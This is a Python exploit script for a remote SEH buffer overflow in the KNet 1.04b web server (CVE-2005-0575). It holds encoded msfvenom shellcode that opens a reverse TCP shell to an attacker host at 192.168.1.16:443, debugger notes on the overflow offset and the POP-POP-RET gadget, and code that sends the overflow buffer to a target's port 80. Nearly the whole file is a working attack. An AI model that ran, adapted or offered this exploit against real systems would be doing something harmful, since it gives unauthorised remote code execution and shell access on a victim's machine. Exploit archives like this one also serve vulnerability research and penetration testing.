#!/usr/bin/env python3

# Exploit Title: KNet 1.04b - Remote Buffer Overflow (SEH)
# Date: 20250203
# Exploit Author: Artur [ajes] Szymczak
# Vendor Homepage: https://www.stormystudios.com/
# Version: 1.04b
# Tested on: Windows 10 EN x86 - build: 10.0.16299
# CVE: CVE-2005-0575

import socket
import struct

# target
host = b"192.168.1.211"
port = 80

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 EXITFUNC=thread -f python -v shellcode â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x2e\x2f"
shellcode =  b""
shellcode += b"\xbb\x51\xe5\x25\x15\xdb\xdb\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc"
shellcode += b"\x03\x0b\xeb\xc7\xe0\x57\x1b\x85\x0b\xa7\xdc"
shellcode += b"\xea\x82\x42\xed\x2a\xf0\x07\x5e\x9b\x72\x45"
shellcode += b"\x53\x50\xd6\x7d\xe0\x14\xff\x72\x41\x92\xd9"
shellcode += b"\xbd\x52\x8f\x1a\xdc\xd0\xd2\x4e\x3e\xe8\x1c"
shellcode += b"\x83\x3f\x2d\x40\x6e\x6d\xe6\x0e\xdd\x81\x83"
shellcode += b"\x5b\xde\x2a\xdf\x4a\x66\xcf\xa8\x6d\x47\x5e"
shellcode += b"\xa2\x37\x47\x61\x67\x4c\xce\x79\x64\x69\x98"
shellcode += b"\xf2\x5e\x05\x1b\xd2\xae\xe6\xb0\x1b\x1f\x15"
shellcode += b"\xc8\x5c\x98\xc6\xbf\x94\xda\x7b\xb8\x63\xa0"
shellcode += b"\xa7\x4d\x77\x02\x23\xf5\x53\xb2\xe0\x60\x10"
shellcode += b"\xb8\x4d\xe6\x7e\xdd\x50\x2b\xf5\xd9\xd9\xca"
shellcode += b"\xd9\x6b\x99\xe8\xfd\x30\x79\x90\xa4\x9c\x2c"
shellcode += b"\xad\xb6\x7e\x90\x0b\xbd\x93\xc5\x21\x9c\xfb"
shellcode += b"\x2a\x08\x1e\xfc\x24\x1b\x6d\xce\xeb\xb7\xf9"
shellcode += b"\x62\x63\x1e\xfe\x85\x5e\xe6\x90\x7b\x61\x17"
shellcode += b"\xb9\xbf\x35\x47\xd1\x16\x36\x0c\x21\x96\xe3"
shellcode += b"\x83\x71\x38\x5c\x64\x21\xf8\x0c\x0c\x2b\xf7"
shellcode += b"\x73\x2c\x54\xdd\x1b\xc7\xaf\xb6\xe3\xb0\xae"
shellcode += b"\x56\x8c\xc2\xb0\x57\xf7\x4a\x56\x3d\x17\x1b"
shellcode += b"\xc1\xaa\x8e\x06\x99\x4b\x4e\x9d\xe4\x4c\xc4"
shellcode += b"\x12\x19\x02\x2d\x5e\x09\xf3\xdd\x15\x73\x52"
shellcode += b"\xe1\x83\x1b\x38\x70\x48\xdb\x37\x69\xc7\x8c"
shellcode += b"\x10\x5f\x1e\x58\x8d\xc6\x88\x7e\x4c\x9e\xf3"
shellcode += b"\x3a\x8b\x63\xfd\xc3\x5e\xdf\xd9\xd3\xa6\xe0"
shellcode += b"\x65\x87\x76\xb7\x33\x71\x31\x61\xf2\x2b\xeb"
shellcode += b"\xde\x5c\xbb\x6a\x2d\x5f\xbd\x72\x78\x29\x21"
shellcode += b"\xc2\xd5\x6c\x5e\xeb\xb1\x78\x27\x11\x22\x86"
shellcode += b"\xf2\x91\x42\x65\xd6\xef\xea\x30\xb3\x4d\x77"
shellcode += b"\xc3\x6e\x91\x8e\x40\x9a\x6a\x75\x58\xef\x6f"
shellcode += b"\x31\xde\x1c\x02\x2a\x8b\x22\xb1\x4b\x9e"

# info from debugging:
## !exchain:
### 0014ffcc: 30714239
### Invalid exception stack at 70423870
## offset:
### 1259

## gadgets:
# .load narly
# !nmod
# $$>a<G:\find_ppr.wds 10010000 10037000

# payload (2000):
nops        = b"\x90" * (1259-len(shellcode)-4)
sjmp        = b"\xEB\x06\x90\x90"           # JMP short 0x08        NSEH
handler     = struct.pack("<I", 0x10016190) # POP,POP,RET           SEH
jmp         = b"\x66\x81\xC4\x30\x08" + b"\xFF\xE4" # ADD SP,830; JMP ESP
payload     = nops + shellcode + sjmp + handler + jmp + b"D" * (2000-len(nops+shellcode+sjmp+handler+jmp))

###
# buffer:
buffer = payload + b" / HTTP/1.0\r\n\r\n"

try:
    print("\nSending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()

    print("\nDone!")

except socket.error:
    print("\nCould not connect!")

